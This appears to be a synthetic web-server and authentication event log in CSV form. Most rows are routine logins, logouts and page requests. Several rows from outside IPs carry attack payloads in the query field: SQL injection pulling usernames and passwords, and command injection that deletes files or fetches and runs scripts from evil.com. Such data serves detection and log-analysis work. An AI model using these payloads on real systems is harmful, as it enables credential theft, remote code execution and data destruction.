event_id,timestamp,event_type,source_ip,user_agent,endpoint,http_method,query_params,username,auth_result,failure_reason,dest_port,protocol,connection_result,response_code,response_time_ms
1f2852bb-5c5b-44d3-b632-df0150d784f5,2024-12-01T13:49:26.281166Z,AUTH_ATTEMPT,172.16.0.14,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/logout,POST,,jennifer.white,LOGOUT,,,,,200,91
3c82d77c-ea53-4eaf-930c-d43d26d3084f,2024-12-01T13:54:54.908259Z,HTTP_REQUEST,192.168.1.104,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/logout,POST,,,,,,,,200,56
da2fc9f1-fb40-4a42-899e-cf5f2607b851,2024-12-01T13:59:44.590138Z,HTTP_REQUEST,172.16.0.14,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/dashboard,GET,,,,,,,,200,305
6763abf0-da75-4e30-ab68-c911d424128d,2024-12-01T14:04:20.566677Z,AUTH_ATTEMPT,10.0.0.54,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/logout,POST,,nicole.clark,LOGOUT,,,,,200,90
57371bb9-509e-4ffa-9f0b-2ab5f2641c72,2024-12-01T14:06:45.588051Z,AUTH_ATTEMPT,192.168.1.102,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/logout,POST,,lisa.thomas,LOGOUT,,,,,200,47
160d7757-56a1-4b10-9d80-c04552ba5eba,2024-12-01T14:08:07.700922Z,HTTP_REQUEST,10.0.0.54,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/notifications,GET,,,,,,,,201,365
c577b035-469e-4c17-a390-2ac6b4aebbad,2024-12-01T14:10:11.941010Z,AUTH_ATTEMPT,192.168.1.101,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/logout,POST,,john.doe,LOGOUT,,,,,200,78
13253c2f-18ac-443e-a0e2-596b79afc79a,2024-12-01T14:11:30.737834Z,AUTH_ATTEMPT,172.16.0.12,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/logout,POST,,sarah.johnson,LOGOUT,,,,,200,82
1ae013a3-8c60-4fe7-a1ee-8248dab913ac,2024-12-01T14:15:06.628151Z,AUTH_ATTEMPT,172.16.0.10,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/logout,POST,,jessica.martinez,LOGOUT,,,,,200,65
0068620e-a774-4dc2-a266-ff8a51e5e742,2024-12-01T14:16:09.035259Z,HTTP_REQUEST,192.168.1.104,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/dashboard,GET,,,,,,,,200,183
d92dea8b-5867-4336-b40d-4722b98cb9f3,2024-12-01T14:17:34.835882Z,HTTP_REQUEST,10.0.0.54,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/help,GET,,,,,,,,200,115
354bc87f-5009-489e-9c4d-2162319bba11,2024-12-01T14:21:15.753744Z,AUTH_ATTEMPT,10.0.0.54,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/logout,POST,,michael.harris,LOGOUT,,,,,200,81
770e736a-8c62-4373-8149-8087715b7a15,2024-12-01T14:22:38.572112Z,HTTP_REQUEST,172.16.0.13,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/about,GET,,,,,,,,200,257
9905a92c-c812-439b-92a4-0650c059f330,2024-12-01T14:25:36.065075Z,HTTP_REQUEST,192.168.1.104,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/analytics,GET,,,,,,,,200,330
20ee909b-ea13-4c00-a350-3555814597e3,2024-12-01T14:30:01.921439Z,HTTP_REQUEST,172.16.0.10,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/dashboard,POST,,,,,,,,201,333
004c1862-b20e-47f5-a55f-fde88daafec6,2024-12-01T14:31:22.721256Z,HTTP_REQUEST,192.168.1.104,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/profile,GET,,,,,,,,204,389
7b0e4648-e2a1-41e5-adee-fe9b316dd751,2024-12-01T14:34:39.580738Z,HTTP_REQUEST,192.168.1.104,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/home,GET,,,,,,,,200,221
82d174c7-a827-46e1-8267-69d0ec2d912d,2024-12-01T14:39:03.212909Z,HTTP_REQUEST,172.16.0.11,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login,GET,,,,,,,,200,133
63c0515c-1223-4edc-91a5-ba3f2a800b8c,2024-12-01T14:41:02.886268Z,AUTH_ATTEMPT,192.168.1.101,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/logout,POST,,amanda.taylor,LOGOUT,,,,,200,90
9d0d947c-710a-4db4-81ef-feecdae59455,2024-12-01T14:43:32.104006Z,HTTP_REQUEST,10.0.0.52,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/notifications,POST,,,,,,,,200,198
8065863a-a541-41e2-b1e7-f51380982740,2024-12-01T14:45:29.687336Z,HTTP_REQUEST,45.129.56.200,python-requests/2.28.1,/api/orders,GET,"id=' UNION SELECT username,password FROM users --",,,,,,,403,82
34a6f404-7f77-4427-93d5-ac170ebef64b,2024-12-01T14:48:43.577828Z,HTTP_REQUEST,10.0.0.51,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/profile,GET,,,,,,,,200,49
76b7e12f-3125-4687-be7a-6ff4ab09c480,2024-12-01T14:49:50.184836Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/home,GET,,,,,,,,200,30
03af9622-2620-4c6f-b6f0-c9d183713388,2024-12-01T14:53:55.740167Z,HTTP_REQUEST,10.0.0.52,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/reports,GET,,,,,,,,201,368
85d1feff-e4f2-4f7e-a815-456286c14cba,2024-12-01T14:54:30.203837Z,HTTP_REQUEST,172.16.0.12,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/analytics,POST,,,,,,,,204,119
ed1a4f2c-cb55-4530-93d9-37dc6d9a843d,2024-12-01T14:57:13.449896Z,HTTP_REQUEST,172.16.0.12,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/home,GET,,,,,,,,200,136
b1492a9e-1537-405b-8060-53f1cc589ecb,2024-12-01T14:58:57.525630Z,HTTP_REQUEST,172.16.0.13,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/profile,GET,,,,,,,,201,266
7c6ff9b5-1629-48e2-a8ee-90df785f5174,2024-12-01T14:58:59.371696Z,HTTP_REQUEST,185.156.73.54,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/search,POST,"search=admin' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION())) --",,,,,,,500,76
49ab27d2-0efa-4bdc-a02d-bbc7c62a3965,2024-12-01T14:59:37.407892Z,HTTP_REQUEST,172.16.0.14,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/reports,GET,,,,,,,,200,164
f4f552a0-721b-415d-8e55-519798b451fd,2024-12-01T15:00:22.977834Z,AUTH_ATTEMPT,172.16.0.10,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login,POST,,james.jackson,SUCCESS,,,,,200,145
d71489fc-386f-497d-980d-d4b6a118b33b,2024-12-01T15:02:02.154595Z,HTTP_REQUEST,172.16.0.13,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/help,GET,,,,,,,,201,185
25874aeb-bdb8-41b7-9d02-58cecbda30b2,2024-12-01T15:04:27.423387Z,HTTP_REQUEST,10.0.0.53,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/settings,GET,,,,,,,,200,27
8d01e2f7-5231-4896-a10c-8638cd566996,2024-12-01T15:05:24.918026Z,HTTP_REQUEST,192.168.1.100,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/login,GET,,,,,,,,200,219
e7724449-5213-46f8-8995-7a6380c9cedf,2024-12-01T15:06:42.990037Z,HTTP_REQUEST,10.0.0.53,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/about,GET,,,,,,,,200,142
5e20e0d5-2bbd-44ec-8262-4a0499b62f45,2024-12-01T15:07:23.115499Z,AUTH_ATTEMPT,192.168.1.102,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login,POST,,jane.smith,SUCCESS,,,,,200,116
37c026cf-375d-4af9-8022-03263c3ae86b,2024-12-01T15:08:54.541028Z,HTTP_REQUEST,10.0.0.53,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/users,GET,,,,,,,,200,229
20d8057c-a3fb-4661-8350-c26e44182522,2024-12-01T15:11:43.275338Z,HTTP_REQUEST,10.0.0.53,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/home,GET,,,,,,,,200,371
204a5113-58d7-4436-8d81-4c1801a8e8bf,2024-12-01T15:15:45.846653Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/notifications,POST,,,,,,,,204,184
9380ede7-8edf-4b89-baf3-17e9697331d2,2024-12-01T15:20:19.645206Z,HTTP_REQUEST,172.16.0.13,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/notifications,GET,,,,,,,,204,278
e28e2d6f-a50a-483d-b392-1e95d51a906f,2024-12-01T15:23:33.889933Z,AUTH_ATTEMPT,172.16.0.12,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/logout,POST,,jane.smith,LOGOUT,,,,,200,65
0b81709f-c1e8-4ef0-8586-5efee716594d,2024-12-01T15:24:25.647878Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/dashboard,GET,,,,,,,,201,141
e77eb85c-e0e7-4c86-91f1-6ec8d01650c5,2024-12-01T15:25:55.348108Z,HTTP_REQUEST,10.0.0.52,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/reports,POST,,,,,,,,200,204
ae728ec0-d208-4975-875a-deaf3212008c,2024-12-01T15:26:22.215309Z,AUTH_ATTEMPT,192.168.1.100,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login,POST,,david.brown,SUCCESS,,,,,200,92
7ef3ad91-5a8e-4a99-b1c9-ed49d6e5b10b,2024-12-01T15:31:49.965243Z,HTTP_REQUEST,172.16.0.11,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/dashboard,GET,,,,,,,,200,229
77d52e18-3276-444e-826b-9e3780b968db,2024-12-01T15:34:41.114377Z,HTTP_REQUEST,172.16.0.11,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/dashboard,POST,,,,,,,,200,202
eb3e0166-3584-4215-9503-198a7a39b074,2024-12-01T15:39:25.026587Z,AUTH_ATTEMPT,172.16.0.12,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/logout,POST,,lisa.thomas,LOGOUT,,,,,200,74
9fb3b0b6-a125-4236-b67f-07ad7f331a05,2024-12-01T15:42:40.047344Z,AUTH_ATTEMPT,172.16.0.14,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/login,POST,,nicole.clark,SUCCESS,,,,,200,199
6f257ebb-3750-4d0a-b0ca-f0a89a12daae,2024-12-01T15:43:47.191872Z,HTTP_REQUEST,185.156.73.54,gobuster/3.5,/api/diagnostic,GET,host=localhost; rm -rf /,,,,,,,500,4487
ce7d6db8-c4f6-47e5-9c59-c53492d4ec37,2024-12-01T15:45:16.133982Z,HTTP_REQUEST,192.168.1.103,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/about,GET,,,,,,,,200,329
eae54dea-463b-4cdd-a5e0-f4247a2f8c84,2024-12-01T15:49:31.833810Z,HTTP_REQUEST,10.0.0.51,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/contact,GET,,,,,,,,200,166
a44750a2-6cb9-4198-b81e-53061adcecce,2024-12-01T15:52:07.123156Z,HTTP_REQUEST,192.168.1.103,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/users,GET,,,,,,,,200,277
ac66ed1a-19f1-44a5-82d7-cd79c61550ae,2024-12-01T15:55:36.809998Z,AUTH_ATTEMPT,192.168.1.103,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/logout,POST,,andrew.rodriguez,LOGOUT,,,,,200,83
216002fe-dcc4-4369-9f21-1220c74ee3ab,2024-12-01T16:00:31.976457Z,AUTH_ATTEMPT,172.16.0.13,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/login,POST,,chris.miller,SUCCESS,,,,,200,227
ae9c93a6-8bd0-48bd-a3be-208719924123,2024-12-01T16:04:35.363281Z,AUTH_ATTEMPT,10.0.0.51,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/logout,POST,,lisa.thomas,LOGOUT,,,,,200,89
65af3e98-0b11-415d-9be2-5c0575a3f706,2024-12-01T16:07:12.804595Z,HTTP_REQUEST,10.0.0.54,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/about,GET,,,,,,,,200,203
0e32f3de-cbc3-496e-87b6-80780e9e11b0,2024-12-01T16:09:48.355278Z,AUTH_ATTEMPT,10.0.0.52,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,amanda.taylor,SUCCESS,,,,,200,192
0370b22c-3d3c-4942-8416-7e64cea80709,2024-12-01T16:14:04.388059Z,HTTP_REQUEST,192.168.1.104,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/help,GET,,,,,,,,204,309
68c8d31c-3ac3-45c9-90be-6455251997e2,2024-12-01T16:17:43.701601Z,HTTP_REQUEST,185.156.73.54,masscan/1.3.2,/api/ping,GET,host=localhost$(wget -O- http://evil.com/c2.sh),,,,,,,403,4490
c3a33036-e4f4-4539-bf1b-8216d892de27,2024-12-01T16:19:57.094875Z,HTTP_REQUEST,172.16.0.14,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/reports,GET,,,,,,,,200,316
9c88e3b9-3391-46c4-b796-1b17eaca95e1,2024-12-01T16:22:03.714169Z,HTTP_REQUEST,192.168.1.104,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/logout,GET,,,,,,,,200,353
1781b804-3585-4596-96de-9617b9bbc1d9,2024-12-01T16:26:44.084251Z,HTTP_REQUEST,192.168.1.104,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/products,POST,,,,,,,,201,281
1f0ae0ec-e979-482d-b78d-8b0f7e5c0256,2024-12-01T16:28:55.219748Z,HTTP_REQUEST,172.16.0.11,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/contact,GET,,,,,,,,200,287
9f117090-f154-4e56-b8b2-7531fb9d7139,2024-12-01T16:31:12.317440Z,AUTH_ATTEMPT,172.16.0.13,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/logout,POST,,andrew.rodriguez,LOGOUT,,,,,200,74
0c1d5fc2-44f4-48b6-bbfc-8e4c621fd0b1,2024-12-01T16:35:45.960998Z,HTTP_REQUEST,10.0.0.53,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/api/profile,POST,,,,,,,,204,203
502f9c42-aea8-4241-b020-c0951ea9cfbe,2024-12-01T16:36:19.802572Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/dashboard,GET,,,,,,,,201,330
a0ddd41b-42b2-4ad2-b734-59301c793b05,2024-12-01T16:37:29.042325Z,HTTP_REQUEST,172.16.0.12,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/api/products,POST,,,,,,,,204,272
3f62e8d3-2b28-402f-8e1e-dd483f83c5b5,2024-12-01T16:40:20.818436Z,AUTH_ATTEMPT,10.0.0.52,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login,POST,,david.brown,SUCCESS,,,,,200,238
2cc060f3-b2ef-4b61-b1b3-14e4c3a27bf4,2024-12-01T16:41:09.427721Z,AUTH_ATTEMPT,10.0.0.52,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/logout,POST,,robert.anderson,LOGOUT,,,,,200,48
f8cbd886-da74-4be3-9dcc-a16e14ab8673,2024-12-01T16:46:00.851195Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/dashboard,POST,,,,,,,,204,122
871a3812-bf47-4b2d-ad6f-cb59d5bd512a,2024-12-01T16:48:14.781122Z,AUTH_ATTEMPT,192.168.1.101,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/logout,POST,,john.doe,LOGOUT,,,,,200,90
78e1dfd5-e28c-4445-95de-840c438d87af,2024-12-01T16:52:30.690993Z,HTTP_REQUEST,10.0.0.51,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/search,GET,,,,,,,,204,43
5341f3af-93cf-469a-a4bd-51424f45c919,2024-12-01T16:54:07.068356Z,HTTP_REQUEST,10.0.0.51,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/contact,POST,,,,,,,,201,76
5977d747-a3e6-456a-9e79-e9c0d68be4e9,2024-12-01T16:55:51.790789Z,HTTP_REQUEST,192.168.1.104,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/docs,GET,,,,,,,,200,130
2f4f35e9-8ac0-4258-bddc-d85b73731675,2024-12-01T16:57:50.092066Z,HTTP_REQUEST,10.0.0.53,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/logout,POST,,,,,,,,201,183
4438283b-3421-448c-9f45-0b9f0e14e8e0,2024-12-01T16:59:24.953486Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/profile,POST,,,,,,,,200,178
b442ec96-9353-4f1d-95f1-2054eef7209a,2024-12-01T17:04:32.751380Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/notifications,GET,,,,,,,,200,151
0fb2cb4a-6880-41fa-b975-4fbd4d9f2a99,2024-12-01T17:08:31.069575Z,HTTP_REQUEST,10.0.0.53,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/profile,GET,,,,,,,,200,250
b865d6c4-48b2-49ad-ba4f-c712c534ea98,2024-12-01T17:10:45.444340Z,HTTP_REQUEST,10.0.0.50,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/login,POST,,,,,,,,201,248
31fb081b-dc4f-4171-b8ac-2375bd427531,2024-12-01T17:13:58.112108Z,HTTP_REQUEST,195.54.160.149,Wget/1.21.1,/api/diagnostic,GET,host=localhost`curl http://evil.com/malware.sh | bash`,,,,,,,500,59
2bc3978c-c3cb-4943-b4d2-70c67a6835b4,2024-12-01T17:14:42.579970Z,HTTP_REQUEST,10.0.0.51,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/api/users,GET,,,,,,,,200,383
287a2ed7-032a-480b-a7b4-8f631239b7f2,2024-12-01T17:18:03.827947Z,HTTP_REQUEST,192.168.1.102,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/profile,GET,,,,,,,,200,78
18e8afd9-25a7-4c4f-ae43-aa6d63d471a4,2024-12-01T17:19:03.876557Z,HTTP_REQUEST,192.168.1.101,"Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",/api/users,GET,,,,,,,,200,90
f228c0ab-3d22-4d27-914b-7bbc1fca0aad,2024-12-01T17:22:43.740427Z,AUTH_ATTEMPT,10.0.0.51,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/login,POST,,john.doe,SUCCESS,,,,,200,177
c1361497-0c96-48fa-b879-c3eaedb876ee,2024-12-01T17:23:37.102744Z,HTTP_REQUEST,194.26.192.64,Wget/1.21.1,/api/keys,GET,,,,,,,,200,96
f607ed82-262b-4d77-9025-5c54758a5bf9,2024-12-01T17:25:03.921670Z,HTTP_REQUEST,192.168.1.103,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/home,GET,,,,,,,,200,137
97ef4582-8619-4142-a9c1-ed03f86d0957,2024-12-01T17:28:34.892436Z,HTTP_REQUEST,172.16.0.14,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/api/profile,GET,,,,,,,,200,48
1ce12762-3aa7-4343-a251-af5048bb5b11,2024-12-01T17:32:27.286906Z,HTTP_REQUEST,10.0.0.51,"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",/home,GET,,,,,,,,200,321
a6d0aa28-a796-49e6-9e6d-aabba5225c97,2024-12-01T17:33:52.845657Z,AUTH_ATTEMPT,10.0.0.52,Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0,/login,POST,,james.jackson,SUCCESS,,,,,200,180
97cf0d15-d435-46bd-b607-ef057ddc050f,2024-12-01T17:38:45.120777Z,HTTP_REQUEST,192.168.1.100,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",/help,GET,,,,,,,,201,205
